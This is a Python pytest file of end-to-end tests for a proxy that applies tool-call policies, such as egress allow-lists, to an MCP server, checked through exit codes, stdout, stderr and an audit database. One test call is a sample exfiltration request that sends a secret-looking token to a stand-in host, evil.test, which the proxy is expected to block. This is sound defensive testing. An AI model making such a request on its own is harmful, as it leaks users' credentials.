"""End-to-end tests for `toolgate wrap` (T8, C2): real processes, real pipes.

Each test starts `python -m toolgate wrap ... -- python fake_mcp_server.py`
as a subprocess, talks to it over its stdin/stdout exactly as a host would,
and checks the exit code, what reached stdout, what reached stderr and what
the audit file holds.
"""

from __future__ import annotations

import json
import os
import queue
import sqlite3
import subprocess
import sys
import threading
from pathlib import Path
from typing import Any

import pytest

FAKE_SERVER = Path(__file__).resolve().parent / "fixtures" / "fake_mcp_server.py"

POLICY = """
calibrated: false
on_detector_failure: escalate
detectors:
  injection: []
  redaction: [pii]
  inert: []
thresholds:
  pii:
    redact: 0.7
state_dir: "state"
tool_calls:
  default: allow
  rules:
    fake.fetch:
      egress: ["docs.example.com"]
"""


def _write_policy(tmp_path: Path, text: str = POLICY) -> Path:
    path = tmp_path / "fake.yaml"
    path.write_text(text, encoding="utf-8")
    return path


def _line(message: Any) -> bytes:
    return json.dumps(message).encode() + b"\n"


def _request(request_id: int, method: str, params: Any = None) -> bytes:
    message: dict[str, Any] = {"jsonrpc": "2.0", "id": request_id, "method": method}
    if params is not None:
        message["params"] = params
    return _line(message)


def _call(request_id: int, name: str, arguments: dict[str, Any]) -> bytes:
    return _request(request_id, "tools/call", {"name": name, "arguments": arguments})


SESSION = [
    _request(1, "initialize", {"protocolVersion": "2025-06-18", "capabilities": {}}),
    _line({"jsonrpc": "2.0", "method": "notifications/initialized"}),
    _request(2, "tools/list"),
    _call(3, "fetch", {"url": "https://docs.example.com/guide"}),
    _call(4, "fetch", {"url": "https://evil.test/?d=sk-live-secret"}),
    _call(5, "echo", {}),
]


def _drive(
    args: list[str],
    lines: list[bytes],
    *,
    env: dict[str, str],
    cwd: Path,
    hold_stdin_until_eof: bool,
) -> subprocess.CompletedProcess[bytes]:
    """Talk to the proxy the way a host does: one request, then wait for its reply.

    With `hold_stdin_until_eof`, stdin stays open until the proxy closes its
    stdout, so a server that exits first is seen as exiting first.
    """
    process = subprocess.Popen(
        args,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        env=env,
        cwd=cwd,
    )
    assert process.stdin is not None and process.stdout is not None and process.stderr is not None
    stdout_lines: queue.Queue[bytes | None] = queue.Queue()
    received: list[bytes] = []
    stderr_chunks: list[bytes] = []

    def pump_stdout() -> None:
        assert process.stdout is not None
        for raw in process.stdout:
            stdout_lines.put(raw)
        stdout_lines.put(None)

    def pump_stderr() -> None:
        assert process.stderr is not None
        stderr_chunks.append(process.stderr.read())

    threading.Thread(target=pump_stdout, daemon=True).start()
    stderr_thread = threading.Thread(target=pump_stderr, daemon=True)
    stderr_thread.start()
    eof = False

    def wait_for(request_id: Any) -> None:
        nonlocal eof
        while not eof:
            raw = stdout_lines.get(timeout=30)
            if raw is None:
                eof = True
                return
            received.append(raw)
            if json.loads(raw).get("id") == request_id:
                return

    try:
        for data in lines:
            process.stdin.write(data)
            process.stdin.flush()
            message = json.loads(data)
            if "id" in message and "method" in message:
                wait_for(message["id"])
        if hold_stdin_until_eof:
            wait_for(object())  # an id that never comes: read until EOF
        process.stdin.close()
    except (BrokenPipeError, OSError):
        pass  # the proxy exited first; its exit code says why
    returncode = process.wait(timeout=60)
    while not eof:
        raw = stdout_lines.get(timeout=30)
        if raw is None:
            break
        received.append(raw)
    stderr_thread.join(timeout=30)
    return subprocess.CompletedProcess(
        args, returncode, b"".join(received), b"".join(stderr_chunks)
    )


def _wrap(
    tmp_path: Path,
    lines: list[bytes],
    *,
    config: Path | None = None,
    server_args: tuple[str, ...] = (),
    extra_env: dict[str, str] | None = None,
    name: str = "fake",
    use_env_config: bool = False,
    hold_stdin_until_eof: bool = False,
) -> subprocess.CompletedProcess[bytes]:
    env = dict(os.environ)
    env.pop("TOOLGATE_CONFIG", None)
    env.update(extra_env or {})
    args = [sys.executable, "-m", "toolgate", "wrap", "--name", name]
    if config is not None and not use_env_config:
        args += ["--config", str(config)]
    elif config is not None:
        env["TOOLGATE_CONFIG"] = str(config)
    args += ["--", sys.executable, str(FAKE_SERVER), *server_args]
    return _drive(args, lines, env=env, cwd=tmp_path, hold_stdin_until_eof=hold_stdin_until_eof)


def _replies(stdout: bytes) -> dict[Any, dict[str, Any]]:
    return {m["id"]: m for m in (json.loads(x) for x in stdout.splitlines()) if "id" in m}


class TestSession:
    def test_a_session_through_the_proxy(self, tmp_path: Path) -> None:
        completed = _wrap(tmp_path, SESSION, config=_write_policy(tmp_path))
        stderr = completed.stderr.decode()
        assert completed.returncode == 0, stderr

        replies = _replies(completed.stdout)
        assert set(replies) == {1, 2, 3, 4, 5}
        assert "docs.example.com" in replies[3]["result"]["content"][0]["text"]
        blocked = replies[4]["result"]
        assert blocked["isError"] is True
        assert blocked["content"][0]["text"] == "Blocked by toolgate policy: rule fake.fetch.egress"
        assert b"sk-live-secret" not in completed.stdout

        # stdout hygiene: nothing but JSON-RPC lines.
        for raw in completed.stdout.splitlines():
            assert json.loads(raw)["jsonrpc"] == "2.0"

        # C2: the coverage line, after tools/list.
        assert "toolgate[fake]: 1 of 2 tools constrained (default: allow); audit: " in stderr
        assert "blocked fetch (rule fake.fetch.egress)" in stderr

    def test_the_audit_file_is_per_server_under_state_dir(self, tmp_path: Path) -> None:
        _wrap(tmp_path, SESSION, config=_write_policy(tmp_path))
        audit = tmp_path / "state" / "audit" / "fake.sqlite"
        assert audit.is_file()
        with sqlite3.connect(audit) as db:
            rows = db.execute(
                "SELECT tool_name, fused_decision, outcome, note FROM decision_log ORDER BY id"
            ).fetchall()
        blocks = [r for r in rows if r[1] == "block"]
        assert blocks == [("fetch", "block", "tool_call", blocks[0][3])]
        assert "fake.fetch.egress" in blocks[0][3]
        assert all("sk-live" not in str(r) for r in rows)
        assert sum(1 for r in rows if r[2] == "result") == 2  # calls 3 and 5

    def test_config_from_the_environment(self, tmp_path: Path) -> None:
        completed = _wrap(
            tmp_path, SESSION[:3], config=_write_policy(tmp_path), use_env_config=True
        )
        assert completed.returncode == 0
        assert set(_replies(completed.stdout)) == {1, 2}

    def test_the_child_gets_the_hosts_environment(self, tmp_path: Path) -> None:
        """C6, through the whole CLI: a token the server needs reaches it unchanged."""
        completed = _wrap(
            tmp_path,
            [*SESSION[:3], _call(5, "echo", {})],
            config=_write_policy(tmp_path),
            server_args=("--env", "TOOLGATE_TEST_TOKEN"),
            extra_env={"TOOLGATE_TEST_TOKEN": "tok-123"},
        )
        assert "env=tok-123" in _replies(completed.stdout)[5]["result"]["content"][0]["text"]

    def test_the_server_exiting_first_is_exit_2(self, tmp_path: Path) -> None:
        completed = _wrap(
            tmp_path,
            SESSION,
            config=_write_policy(tmp_path),
            server_args=("--exit-after", "2"),
            hold_stdin_until_eof=True,
        )
        assert completed.returncode == 2
        assert "exit status 7" in completed.stderr.decode()


class TestStartupFailures:
    """Exit 1 before the child starts; stdout stays empty (design: no pass-through)."""

    def _assert_not_started(
        self, completed: subprocess.CompletedProcess[bytes], tmp_path: Path
    ) -> None:
        assert completed.returncode == 1, completed.stderr.decode()
        assert completed.stdout == b""
        assert not (tmp_path / "marker").exists()
        assert "not started" in completed.stderr.decode()

    def _run(self, tmp_path: Path, **kwargs: Any) -> subprocess.CompletedProcess[bytes]:
        return _wrap(
            tmp_path,
            SESSION,
            server_args=("--marker", str(tmp_path / "marker")),
            **kwargs,
        )

    def test_no_config_at_all(self, tmp_path: Path) -> None:
        self._assert_not_started(self._run(tmp_path), tmp_path)

    def test_a_missing_config_file(self, tmp_path: Path) -> None:
        self._assert_not_started(self._run(tmp_path, config=tmp_path / "nope.yaml"), tmp_path)

    @pytest.mark.parametrize(
        "text",
        [
            "not: [valid",
            "- a list",
            "tool_calls:\n  rules:\n    fake.fetch:\n      egress: ['https://x']\n",
            "tool_calls:\n  rules:\n    fake.read:\n      paths: ['{sandboxx}/**']\n",
            "tool_calls:\n  rules:\n    fake.read:\n      paths: ['${TOOLGATE_SURELY_UNSET}/**']\n",
            "tool_calls:\n  rules:\n    fake.read:\n      paths: ['{sandbox}/**']\n",
            "detectors:\n  injection: [no_such_detector]\n",
            "audit_path: 7\n",
        ],
    )
    def test_an_invalid_config(self, tmp_path: Path, text: str) -> None:
        completed = self._run(tmp_path, config=_write_policy(tmp_path, text))
        self._assert_not_started(completed, tmp_path)

    def test_an_invalid_name(self, tmp_path: Path) -> None:
        completed = self._run(tmp_path, config=_write_policy(tmp_path), name="bad.name")
        self._assert_not_started(completed, tmp_path)

    def test_a_valid_config_does_start_the_server(self, tmp_path: Path) -> None:
        completed = self._run(tmp_path, config=_write_policy(tmp_path))
        assert completed.returncode == 0
        assert (tmp_path / "marker").exists()

    def test_sandbox_and_placeholders_expand(self, tmp_path: Path) -> None:
        text = (
            POLICY.replace("tool_calls:", 'sandbox: "box"\ntool_calls:')
            + "    fake.read:\n      paths: ['{sandbox}/**', '~/x/**']\n"
        )
        completed = self._run(tmp_path, config=_write_policy(tmp_path, text))
        assert completed.returncode == 0, completed.stderr.decode()


EXAMPLES = Path(__file__).resolve().parent.parent / "examples"


@pytest.mark.parametrize("name", ["internal-api.yaml", "docs-and-github.yaml"])
def test_example_policies_load_through_the_wrap_loader(name: str, tmp_path: Path) -> None:
    """C1: the README's example policies are valid `wrap` configs as shipped."""
    from toolgate.proxy.wrap import load_wrap_config

    config = load_wrap_config("fetch", EXAMPLES / name, environ={}, home=tmp_path)
    rule = config.policy.tool_calls.rules["fetch.fetch"]
    assert rule.egress
    assert config.audit_path.name == "fetch.sqlite"


def test_example_internal_api_policy_means_what_its_comments_say(tmp_path: Path) -> None:
    from toolgate.gating.tool_calls import ToolDecision, evaluate_tool_call
    from toolgate.proxy.wrap import load_wrap_config

    policy = load_wrap_config(
        "fetch", EXAMPLES / "internal-api.yaml", environ={}, home=tmp_path
    ).policy.tool_calls
    schema = {"type": "object", "properties": {"url": {"type": "string"}}}

    def verdict(url: str) -> ToolDecision:
        return evaluate_tool_call(policy, "fetch", "fetch", {"url": url}, schema=schema).decision

    assert verdict("https://api.internal.example:8443/v1/x") is ToolDecision.ALLOW
    assert verdict("https://api.internal.example/v1/x") is ToolDecision.BLOCK
    assert verdict("https://billing.svc.internal.example/") is ToolDecision.ALLOW
    assert verdict("https://billing.svc.internal.example:8080/") is ToolDecision.BLOCK
    assert verdict("https://evil.test/") is ToolDecision.BLOCK
    other = evaluate_tool_call(policy, "fetch", "other_tool", {}, schema=schema)
    assert other.decision is ToolDecision.BLOCK  # default: block
